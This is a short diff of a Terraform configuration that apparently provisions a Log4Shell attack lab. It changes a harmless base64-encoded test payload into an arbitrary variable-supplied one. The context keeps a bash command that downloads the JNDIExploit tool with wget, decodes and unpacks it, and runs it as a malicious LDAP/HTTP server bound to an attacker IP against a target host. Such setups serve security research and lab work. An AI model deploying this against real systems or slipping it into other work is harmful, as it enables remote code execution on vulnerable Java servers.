@@ -7,9 +7,8 @@ locals {
     attacker_ip=var.attacker_ip
     target_ip=var.target_ip
     target_port=var.target_port
-    base64_log4shell_payload=base64encode(<<-EOT
-    touch /tmp/log4shell_pwned
-    EOT
+    base64_log4shell_payload=base64encode(
+        var.payload
     )
     command_payload=<<-EOT
     bash -c "wget ${local.jdniexploit_url} && base64 -d jndi.base64 > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip ${local.attacker_ip} --httpPort ${local.attacker_http_port} --ldapPort ${local.attacker_ldap_port}"
